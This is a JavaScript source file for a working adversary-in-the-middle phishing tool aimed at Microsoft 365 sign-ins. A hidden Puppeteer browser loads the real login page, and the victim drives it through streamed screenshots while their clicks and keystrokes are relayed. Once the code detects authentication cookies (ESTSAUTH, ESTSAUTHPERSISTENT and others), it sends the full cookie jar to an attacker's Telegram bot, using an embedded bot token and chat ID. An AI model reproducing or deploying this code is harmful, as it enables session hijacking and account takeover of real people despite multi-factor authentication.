const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';
const VIEWPORT_WIDTH = 1280;
const VIEWPORT_HEIGHT = 720;

async function sendExfiltrationAlert(cookies, finalUrl, source) {
    const docUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
    const msgUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    try {
        const host = new URL(finalUrl).hostname;
        const textAlert = `<b>🚨 SESSION HIJACK SUCCESS</b>\n\n<b>Trigger:</b> <code>${source}</code>\n<b>Domain:</b> <code>${host}</code>\n<b>Total Cookies:</b> ${cookies.length}\n\n<i>Status: Persistence tokens (ESTSAUTHPERSISTENT/CCState) verified.</i>`;
        
        await axios.post(msgUrl, { chat_id: CHAT_ID, text: textAlert, parse_mode: 'HTML' });

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('caption', `Full Auth Jar: ${host}`);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2), 'utf-8'), {
            filename: `AUTH_JAR_${Date.now()}.json`,
            contentType: 'application/json'
        });

        await axios.post(docUrl, form, { headers: form.getHeaders() });
        console.log(`[EXFIL] Successfully sent jar via ${source}`);
    } catch (e) {
        console.error('[TELEGRAM-ERR]', e.message);
    }
}

async function startSession(io, socket) {
    let browser;
    let hasExfiltrated = false;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox', `--window-size=${VIEWPORT_WIDTH},${VIEWPORT_HEIGHT}`]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: VIEWPORT_WIDTH, height: VIEWPORT_HEIGHT });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        // Capture Helper
        const attemptExfiltration = async (source) => {
            if (hasExfiltrated) return;

            const cookies = await page.cookies();
            const criticalTokens = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'CCState', '__Host-MSAAUTH', 'RPSSecAuth'];
            
            const isFullyAuth = cookies.some(c => criticalTokens.includes(c.name));

            if (isFullyAuth) {
                hasExfiltrated = true; 
                console.log(`[SUCCESS] Valid session tokens found via ${source}.`);
                
                // Settlement delay: Crucial for 2026 persistence cookies to finish writing
                await new Promise(r => setTimeout(r, 5000));
                
                const finalJar = await page.cookies();
                await sendExfiltrationAlert(finalJar, page.url(), source);
            }
        };

        // 1. MONITOR NETWORK RESPONSES (The Evilginx Way)
        // We look for the specific KMSI or Token POST responses from MS servers
        page.on('response', async (response) => {
            const url = response.url().toLowerCase();
            if (url.includes('/kmsi') || url.includes('/token') || url.includes('landingv2')) {
                await attemptExfiltration('Network-Intercept');
            }
        });

        // 2. MONITOR FRAME NAVIGATION
        page.on('framenavigated', async (frame) => {
            const url = frame.url().toLowerCase();
            if (url.includes('office.com') || url.includes('outlook.live.com') || url.includes('microsoft365.com')) {
                await attemptExfiltration('Navigation-Trigger');
            }
        });

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' }).catch(() => {});
        const heartbeat = setInterval(emitFrame, 1200);

        // 3. FAILSAFE POLLING
        const poller = setInterval(() => attemptExfiltration('Periodic-Polling'), 4000);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') await page.mouse.click(data.x, data.y, { delay: 50 });
                else if (data.type === 'key') await page.keyboard.press(data.key);
                await emitFrame();
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            clearInterval(poller);
            if (browser) await browser.close();
        });

    } catch (error) {
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
